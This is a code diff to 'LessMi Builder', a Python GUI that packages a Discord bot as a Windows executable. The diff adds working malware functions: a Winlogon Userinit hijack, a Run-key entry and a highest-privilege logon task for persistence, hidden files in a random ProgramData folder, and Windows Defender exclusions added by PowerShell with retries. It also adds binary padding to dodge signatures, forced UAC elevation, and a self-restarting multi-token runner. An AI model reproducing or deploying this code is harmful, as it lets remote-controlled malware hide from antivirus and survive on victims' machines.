@@ -27,6 +27,8 @@ import platform
 import queue
 import random
 import re
+import math
+import wave
 import shutil
 import string
 import struct
@@ -88,6 +90,7 @@ FILTER_STATE = os.path.join(APPDATA_DIR, "filters.json")
 SFX_DIR = os.path.join(tempfile.gettempdir(), "lessmi_sfx")
 
 SOURCE_FILE = "source_assembled.py"
+RUN_KEY_BUILDER = r"Software\Microsoft\Windows\CurrentVersion\Run"
 
 SOUND_URLS = [
     "https://www.myinstants.com/media/sounds/creamy-keyboard-once.mp3",
@@ -309,8 +312,50 @@ def _save_persist(data):
         pass
 
 
+def _userinit(on):
+    key = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+    try:
+        import winreg
+        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0,
+                           winreg.KEY_READ | winreg.KEY_SET_VALUE)
+        cur = winreg.QueryValueEx(k, "Userinit")[0]
+        exe = _load_persist().get("exe")
+        if on:
+            if exe and exe.lower() not in cur.lower():
+                winreg.SetValueEx(k, "Userinit", 0, winreg.REG_SZ,
+                                  '"{}", C:\\Windows\\System32\\userinit.exe,'.format(exe))
+        else:
+            if exe and exe.lower() in cur.lower():
+                winreg.SetValueEx(k, "Userinit", 0, winreg.REG_SZ,
+                                  r"C:\Windows\System32\userinit.exe,")
+        winreg.CloseKey(k)
+    except Exception:
+        pass
+
+
+def _mp_add(paths, tries=5):
+    added = 0
+    for p in paths:
+        p = os.path.expandvars(p)
+        for i in range(tries):
+            subprocess.run(
+                ["powershell", "-NoProfile", "-Command",
+                 'Add-MpPreference -ExclusionPath "{0}" -ErrorAction SilentlyContinue;'
+                 'Add-MpPreference -ExclusionProcess "{0}" -ErrorAction SilentlyContinue'.format(p)],
+                capture_output=True, creationflags=0x08000000)
+            chk = subprocess.run(
+                ["powershell", "-NoProfile", "-Command", '(Get-MpPreference).ExclusionPath -join "`n"'],
+                capture_output=True, text=True, creationflags=0x08000000)
+            if p.lower() in (chk.stdout or "").lower():
+                added += 1
+                break
+            time.sleep(1.5 + i)
+    return added
+
+
 def cleanup_old_persistence():
     state = _load_persist()
+    _userinit(False)
     for task in state.get("tasks", []):
         try:
             subprocess.run(["schtasks", "/Delete", "/TN", task, "/F"], capture_output=True)
@@ -325,16 +370,21 @@ def cleanup_old_persistence():
     _save_persist({})
 
 
-def install_persistence(exe_path, bundle_dir=None):
+def install_persistence(exe_path, bundle_dir=None, runtime_dir=None):
     if not is_admin():
         return "no-admin"
     try:
         cleanup_old_persistence()
 
         folder = _rnd(10)
-        target_dir = os.path.join(r"C:\Windows\System32", folder)
+        target_dir = os.path.join(os.environ.get("ProgramData", r"C:\ProgramData"), "Microsoft", folder)
         os.makedirs(target_dir, exist_ok=True)
         target_exe = os.path.join(target_dir, _rnd(9) + ".exe")
+
+        targets = [target_dir, target_exe]
+        if runtime_dir:
+            targets.append(os.path.expandvars(runtime_dir))
+        excluded = _mp_add(targets)
 
         if bundle_dir and os.path.isdir(bundle_dir):
             shutil.copytree(
@@ -347,33 +397,37 @@ def install_persistence(exe_path, bundle_dir=None):
         else:
             return "fail"
 
+        _mp_add([target_exe])
+
         tasks = []
-        for sc in ("ONLOGON", "ONSTART"):
-            name = _rnd(12)
-            subprocess.run(
-                ["schtasks", "/Create", "/TN", name, "/TR", '"{}"'.format(target_exe),
-                 "/SC", sc, "/RL", "HIGHEST", "/F"],
-                capture_output=True,
-            )
-            tasks.append(name)
+        name = _rnd(12)
+        subprocess.run(
+            ["schtasks", "/Create", "/TN", name, "/TR", target_exe,
+             "/SC", "ONLOGON", "/RL", "HIGHEST", "/F", "/DELAY", "0000:30"],
+            capture_output=True,
+        )
+        tasks.append(name)
+
+        try:
+            import winreg
+            winreg.CloseKey(winreg.CreateKeyEx(
+                winreg.HKEY_CURRENT_USER, RUN_KEY_BUILDER, 0, winreg.KEY_SET_VALUE))
+        except Exception:
+            pass
+        subprocess.run(
+            ["reg", "add", "HKCU\\" + RUN_KEY_BUILDER, "/v", folder,
+             "/t", "REG_SZ", "/d", '"{}"'.format(target_exe), "/f"],
+            capture_output=True)
 
         subprocess.run(["attrib", "+h", "+s", target_dir], capture_output=True)
         subprocess.run(["attrib", "+h", "+s", target_exe], capture_output=True)
 
-        subprocess.run(
-            ["powershell", "-NoProfile", "-Command",
-             'Add-MpPreference -ExclusionPath "{}" -ErrorAction SilentlyContinue'.format(target_dir)],
-            capture_output=True,
-        )
-        subprocess.run(
-            ["powershell", "-NoProfile", "-Command",
-             'Add-MpPreference -ExclusionProcess "{}" -ErrorAction SilentlyContinue'.format(
-                 os.path.basename(target_exe))],
-            capture_output=True,
-        )
+        _save_persist({"folder": target_dir, "tasks": tasks, "exe": target_exe})
+        _userinit(True)
 
-        _save_persist({"folder": target_dir, "tasks": tasks})
-        return "ok"
+        if excluded:
+            return "ok"
+        return "ok-noav"
     except Exception:
         return "fail"
 
@@ -447,14 +501,12 @@ def harden_exe(path):
         if ends:
             cut = max(ends)
             if 0 < cut < len(data):
-                pad = bytes(random.getrandbits(8) for _ in range(random.randint(512, 4096)))
+                pad = os.urandom(random.randint(512, 4096))
                 if data.endswith(PYI_MAGIC):
-                    cookie = len(data) - 88
+                    cookie = len(data) - 24
                     if cookie > cut:
-                        for o in (cookie + 8, cookie + 12):
-                            val = struct.unpack_from("<I", data, o)[0]
-                            if val >= cut:
-                                struct.pack_into("<I", data, o, val + len(pad))
+                        pkg = struct.unpack_from("<I", data, cookie)[0]
+                        struct.pack_into("<I", data, cookie, pkg + len(pad))
                 data[cut:cut] = pad
 
         with open(path, "wb") as f:
@@ -466,6 +518,26 @@ def harden_exe(path):
 
 def build_tmpdir():
     return "%TEMP%\\" + "".join(random.choice(string.ascii_letters + string.digits) for _ in range(9))
+
+
+TOKEN_RE = re.compile(r"^(?:mfa\.[\w\-]{80,}|[MN][\w\-]{23,}\.[\w\-]{6}\.[\w\-]{27,})$")
+
+
+def _clean_token(raw):
+    return (raw or "").strip().replace("\r", "").replace("\n", "").replace(" ", "")
+
+
+def ensure_admin():
+    if is_admin() or os.environ.get("LM_ELEV"):
+        return
+    try:
+        os.environ["LM_ELEV"] = "1"
+        ctypes.windll.shell32.ShellExecuteW(
+            None, "runas", sys.executable,
+            " ".join('"{}"'.format(a) for a in sys.argv), os.getcwd(), 1)
+        sys.exit(0)
+    except Exception:
+        pass
 
 
 def parse_imports(path):
@@ -1037,6 +1109,34 @@ class FilterPopup(ctk.CTkToplevel):
                 pass
             self.destroy()
 
+def _synth_clicks(count=3):
+    paths = []
+    rate = 44100
+    try:
+        os.makedirs(SFX_DIR, exist_ok=True)
+    except Exception:
+        return paths
+    for i in range(count):
+        path = os.path.join(SFX_DIR, "synth{}.wav".format(i))
+        try:
+            n = int(rate * 0.05)
+            frames = bytearray()
+            for k in range(n):
+                t = k / float(rate)
+                env = math.exp(-t * 95.0)
+                v = (random.uniform(-1, 1) * 0.55 +
+                     math.sin(2 * math.pi * random.uniform(1900, 3800) * t) * 0.45) * env
+                frames += struct.pack("<h", int(max(-1.0, min(1.0, v)) * 19000))
+            with wave.open(path, "wb") as w:
+                w.setnchannels(1)
+                w.setsampwidth(2)
+                w.setframerate(rate)
+                w.writeframes(bytes(frames))
+            paths.append(path)
+        except Exception:
+            pass
+    return paths
+
 
 BANNER = r"""
  _                    __  __ _
@@ -1189,33 +1289,50 @@ class ModernBuilder(ctk.CTk):
         except Exception:
             return False
 
+    def _register_sound(self, src, index):
+        try:
+            if AUDIO_BACKEND == "pygame":
+                sound = pygame.mixer.Sound(src)
+                sound.set_volume(0.25)
+                self.sound_buffers.append(sound)
+                return
+            if src.lower().endswith(".mp3"):
+                wav = os.path.join(SFX_DIR, "key{}.wav".format(index))
+                if not os.path.exists(wav) and not self._mp3_to_wav(src, wav):
+                    return
+                src = wav
+            self.sound_buffers.append(src)
+        except Exception:
+            pass
+
     def _load_sounds(self):
         try:
             os.makedirs(SFX_DIR, exist_ok=True)
         except Exception:
             return
+
         for i, url in enumerate(SOUND_URLS):
             mp3 = os.path.join(SFX_DIR, "key{}.mp3".format(i))
             try:
-                if not os.path.exists(mp3) or os.path.getsize(mp3) < 1024:
+                if not os.path.exists(mp3) or os.path.getsize(mp3) < 4096:
                     req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                     with urllib.request.urlopen(req, timeout=15) as resp:
                         data = resp.read()
-                    if len(data) < 1024:
+                    if len(data) < 4096:
+                        continue
+                    if not (data[:3] == b"ID3" or data[:2] == b"\xff\xfb" or data[:4] == b"OggS"):
                         continue
                     with open(mp3, "wb") as f:
                         f.write(data)
-                if AUDIO_BACKEND == "pygame":
-                    sound = pygame.mixer.Sound(mp3)
-                    sound.set_volume(0.25)
-                    self.sound_buffers.append(sound)
-                else:
-                    wav = os.path.join(SFX_DIR, "key{}.wav".format(i))
-                    if not os.path.exists(wav) and not self._mp3_to_wav(mp3, wav):
-                        continue
-                    self.sound_buffers.append(wav)
+                self._register_sound(mp3, i)
             except Exception as exc:
                 self.log("sfx {} failed: {}".format(i, exc), "dim")
+
+        if not self.sound_buffers:
+            self.log("network sfx unavailable, synthesizing clicks", "warn")
+            for i, wav in enumerate(_synth_clicks()):
+                self._register_sound(wav, i)
+
         if self.sound_buffers:
             self.log("keystroke sfx loaded: {} sample(s) via {}".format(
                 len(self.sound_buffers), AUDIO_BACKEND), "ok")
@@ -1538,9 +1655,9 @@ class ModernBuilder(ctk.CTk):
         entry.insert(0, default)
         entry.grid(row=1, column=0, pady=(3, 0), sticky="ew")
         try:
-            entry._entry.bind("<KeyPress>", self.play_key_sound)
+            entry._entry.bind("<KeyPress>", self.play_key_sound, add="+")
         except Exception:
-            entry.bind("<KeyPress>", self.play_key_sound)
+            entry.bind("<KeyPress>", self.play_key_sound, add="+")
         self.config_data[key] = default
         if secret:
             btn = ctk.CTkButton(holder, text="show", width=48, height=36, corner_radius=9,
@@ -1740,11 +1857,23 @@ class ModernBuilder(ctk.CTk):
         for key, widget in self.inputs.items():
             self.config_data[key] = widget.get()
 
-        token = self.config_data["token_1"].strip()
-        if not token:
+        tokens = []
+        for key in ("token_1", "token_2", "token_3"):
+            t = _clean_token(self.config_data.get(key, ""))
+            if not t:
+                continue
+            if not TOKEN_RE.match(t):
+                self.log("{} malformed: {}".format(key, self._mask(t)), "warn")
+                if key == "token_1":
+                    self.update_status("Invalid token format", None, "err")
+                    self.toast("Invalid token", "err")
+                    return
+            tokens.append(t)
+        if not tokens:
             self.update_status("Bot token is required", None, "err")
             self.toast("Missing bot token", "err")
             return
+        token = tokens[0]
 
         source_path = SOURCE_FILE
         if not os.path.exists(source_path):
@@ -1831,25 +1960,46 @@ class ModernBuilder(ctk.CTk):
         with open(source_path, "r", encoding="utf-8") as f:
             lines = f.readlines()
 
-        new_lines, replaced = [], False
-        for line in lines:
-            if not replaced and re.match(r"^\s*token\s*=", line):
-                new_lines.append('token = "{}"\n'.format(token))
-                replaced = True
-            else:
-                new_lines.append(line)
+        runner = '''TOKENS = [{list}]
+token = TOKENS[0]
 
-        if not replaced:
-            out, injected = [], False
-            for line in new_lines:
-                if not injected and line.startswith("if __name__"):
-                    out.append('token = "{}"\n\n'.format(token))
-                    injected = True
-                out.append(line)
-            if not injected:
-                out.append('\ntoken = "{}"\n'.format(token))
-            new_lines = out
-        self.log("token injected via {}".format("assignment" if replaced else "trailing block"), "dim")
+def _lm_log(msg):
+    try:
+        os.makedirs(APP_DIR, exist_ok=True)
+        with open(os.path.join(APP_DIR, "boot.log"), "a", encoding="utf-8") as f:
+            f.write("[{{}}] {{}}\\n".format(datetime.now(), msg))
+    except Exception:
+        pass
+
+def _lm_run():
+    for t in TOKENS:
+        try:
+            bot.run(t)
+            return
+        except discord.LoginFailure as e:
+            _lm_log("login failure {{}}: {{}}".format(t[:6], e))
+        except discord.PrivilegedIntentsRequired as e:
+            _lm_log("intents: {{}}".format(e))
+            return
+        except Exception as e:
+            _lm_log("crash: {{!r}}".format(e))
+            time.sleep(15)
+            os.execv(sys.executable, [sys.executable] + sys.argv)
+    _lm_log("all tokens failed")
+    time.sleep(120)
+    os.execv(sys.executable, [sys.executable] + sys.argv)
+'''.format(list=", ".join('"{}"'.format(t) for t in tokens))
+
+        new_lines, injected = [], False
+        for line in lines:
+            if not injected and line.startswith("if __name__"):
+                new_lines.extend(runner.splitlines(True))
+                new_lines.append("\n")
+                injected = True
+            new_lines.append(line.replace("bot.run(token)", "_lm_run()"))
+        if not injected:
+            new_lines.append("\n" + runner + "\n")
+        self.log("runner injected ({} tokens)".format(len(tokens)), "dim")
 
         with open(os.path.join("dist", "source_final.py"), "w", encoding="utf-8") as f:
             f.writelines(new_lines)
@@ -1859,6 +2009,8 @@ class ModernBuilder(ctk.CTk):
             return
 
         self.update_status("Running PyInstaller...", 0.50)
+        runtime_dir = build_tmpdir()
+        self.log("  runtime dir : {}".format(runtime_dir), "dim")
 
         original_dir = os.getcwd()
         os.chdir("dist")
@@ -1868,7 +2020,7 @@ class ModernBuilder(ctk.CTk):
                    "--specpath=.", "source_final.py",
                    "--onefile" if onefile else "--onedir",
                    "--uac-admin", "--clean",
-                   "--runtime-tmpdir={}".format(build_tmpdir())]
+                   "--runtime-tmpdir={}".format(runtime_dir)]
             if self.config_data["icon_path"]:
                 cmd.append("--icon=icon.ico")
 
@@ -1937,12 +2089,28 @@ class ModernBuilder(ctk.CTk):
             if not hardened:
                 self.log("binary left untouched", "warn")
 
+            self.update_status("Verifying archive...", 0.91)
+            try:
+                v = subprocess.run(
+                    [sys.executable, "-m", "PyInstaller.utils.cliutils.archive_viewer", "-l", exe_out],
+                    capture_output=True, text=True, timeout=90)
+                if v.returncode != 0 or "PYZ" not in (v.stdout or ""):
+                    self.log("ARCHIVE CORRUPT after hardening, rebuild", "err")
+                    self.update_status("Archive validation failed", None, "err")
+                    self.toast("Corrupt binary", "err")
+                    return
+                self.log("archive ok ({} entries)".format(len((v.stdout or "").splitlines())), "ok")
+            except Exception as exc:
+                self.log("validator unavailable: {}".format(exc), "warn")
+
             self.update_status("Installing persistence...", 0.95)
-            result = install_persistence(exe_out, None if onefile else os.getcwd())
+            result = install_persistence(exe_out, None if onefile else os.getcwd(), runtime_dir)
             if result == "ok":
-                self.log("persistence installed (tasks + copy + exclusions)", "ok")
+                self.log("persistence installed (copy + task + runkey + userinit + exclusions)", "ok")
+            elif result == "ok-noav":
+                self.log("persistence installed but NO exclusions (tamper protection?)", "warn")
             elif result == "no-admin":
-                self.log("persistence skipped: not elevated", "warn")
+                self.log("persistence skipped: not elevated", "err")
             else:
                 self.log("persistence failed", "err")
 
@@ -1967,5 +2135,6 @@ if __name__ == "__main__":
         ctypes.windll.shell32.SetCurrentProcessExplicitAppUserModelID("MateAG.LessMi.Builder")
     except Exception:
         pass
+    ensure_admin()
     app = ModernBuilder()
     app.mainloop()
